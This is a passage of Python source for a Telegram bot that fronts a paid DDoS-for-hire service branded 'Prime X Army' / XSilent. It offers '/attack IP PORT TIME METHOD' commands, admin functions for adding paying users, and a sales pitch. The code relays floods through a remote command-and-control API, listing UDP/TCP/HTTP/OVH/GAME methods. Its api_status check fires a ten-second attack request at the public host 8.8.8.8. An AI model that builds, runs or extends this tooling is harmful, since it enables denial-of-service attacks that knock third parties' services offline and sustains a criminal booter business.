@bot.message_handler(commands=['stats'])
def stats(msg):
    uid = str(msg.chat.id)
    stats_msg = f"""📊 USER STATISTICS

👤 User ID: {uid}
✅ Status: {'Authorized' if uid in users or uid in ADMIN_ID else 'Unauthorized'}
⏰ Cooldown: {'Active' if uid in cooldown else 'Ready'}

🌐 API Info:
• Endpoint: {API_URL}
• Status: Active
• Max Concurrent: 1

💬 Contact XSilent for premium stats"""
    
    bot.reply_to(msg, stats_msg)

@bot.message_handler(commands=['help'])
def help_cmd(msg):
    bot.reply_to(msg, """🔥 PRIME X ARMY HELP

COMMANDS:
/attack IP PORT TIME METHOD - Launch attack
/methods - Show attack methods
/stats - Your stats
/help - This menu

ADMIN:
/add USER_ID
/remove USER_ID
/allusers

🌐 API Configuration:
• Using remote CNC API
• No local binary required
• Instant attack execution

Buy: XSILENT""")

# ========== ADMIN COMMANDS ==========
@bot.message_handler(commands=['add'])
def add_user(msg):
    if str(msg.chat.id) not in ADMIN_ID:
        bot.reply_to(msg, "❌ Admin only!")
        return
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /add USER_ID")
        return
    new = args[1]
    if new not in users:
        users.append(new)
        users_data["users"] = users
        with open(USERS_FILE, 'w') as f:
            json.dump(users_data, f)
        bot.reply_to(msg, f"✅ User {new} added!")
    else:
        bot.reply_to(msg, "User already exists!")

@bot.message_handler(commands=['remove'])
def remove_user(msg):
    if str(msg.chat.id) not in ADMIN_ID:
        bot.reply_to(msg, "❌ Admin only!")
        return
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /remove USER_ID")
        return
    rem = args[1]
    if rem in users and rem not in ADMIN_ID:
        users.remove(rem)
        users_data["users"] = users
        with open(USERS_FILE, 'w') as f:
            json.dump(users_data, f)
        bot.reply_to(msg, f"✅ User {rem} removed!")

@bot.message_handler(commands=['allusers'])
def all_users(msg):
    if str(msg.chat.id) not in ADMIN_ID:
        bot.reply_to(msg, "❌ Admin only!")
        return
    user_list = "\n".join(users)
    bot.reply_to(msg, f"📋 USERS:\n{user_list}\nTotal: {len(users)}")

@bot.message_handler(commands=['api_status'])
def api_status(msg):
    if str(msg.chat.id) not in ADMIN_ID:
        bot.reply_to(msg, "❌ Admin only!")
        return
    
    try:
        test_response = requests.get(f"{API_URL}?api_key={API_KEY}&target=8.8.8.8&port=80&time=10&concurrent=1", timeout=5)
        status = f"""🌐 API STATUS

📡 API URL: {API_URL}
🔑 API Key: {API_KEY[:6]}...{API_KEY[-4:]}
✅ Status: {'Online' if test_response.status_code == 200 else 'Offline'}
📊 Response Code: {test_response.status_code}"""
        bot.reply_to(msg, status)
    except:
        bot.reply_to(msg, "🌐 API STATUS: OFFLINE\nCannot connect to API server!")

# ========== MAIN ==========
print("""
╔══════════════════════════════════════╗
║    🔥 XSILENT BOT STARTED 🔥         ║
║    API Mode Active                   ║
╠══════════════════════════════════════╣
║  ✅ Bot Online                       ║
║  ✅ Admin: 1917682089                ║
║  ✅ Methods: UDP/TCP/HTTP/OVH/GAME   ║
║  ✅ API: CNC Connection              ║
╚══════════════════════════════════════╝
""")

bot.infinity_polling()
